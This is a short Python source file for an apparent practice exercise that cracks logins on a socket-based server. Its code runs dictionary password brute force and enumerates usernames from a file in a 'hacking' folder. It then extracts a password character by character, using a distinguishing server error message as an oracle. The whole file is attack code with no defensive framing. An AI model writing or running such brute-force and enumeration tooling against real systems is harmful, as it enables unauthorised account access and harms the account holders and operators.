from socket import socket
from finder import DictionnaryPassword
from json import dumps,loads
from string import ascii_letters
from itertools import cycle

class Client:
    size_buffer = 2048

    def __init__(self,address):
        self.address=address

    def __enter__(self):
         self.client = socket()
         self.client.connect(self.address)
         return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.client.close()

    def set_finder(self,finder):
        self.finder = finder

    def search(self):
          for password in self.finder.find_password():
              self.client.send(password.encode())
              response = self.client.recv(self.size_buffer).decode()
              if response == "Connection success!":
                    print(password)
                    break



def payload(**args):
    return dumps(args)

class ClientLogin(Client):
    def __init__(self,address):
        super().__init__(address)

    def search(self):
        logins = DictionnaryPassword("./hacking/logins.txt")
        login_find = ""
        for login in logins.find_password():
            self.client.send(payload(login=login,password=" ").encode())
            response = loads(self.client.recv(self.size_buffer).decode())

            if  response["result"] == "Wrong password!":
                login_find=login
                break


        password=""

        for letter in cycle(ascii_letters+"0123456789"):

            test_password = password  + letter

            self.client.send(payload(login=login_find,password=test_password).encode())
            response=loads(self.client.recv(self.size_buffer).decode())

            if response["result"]=="Exception happened during login":
                password+=letter
            elif response["result"]=="Connection success!":
                print(payload(login=login_find,password=password+letter))
                break










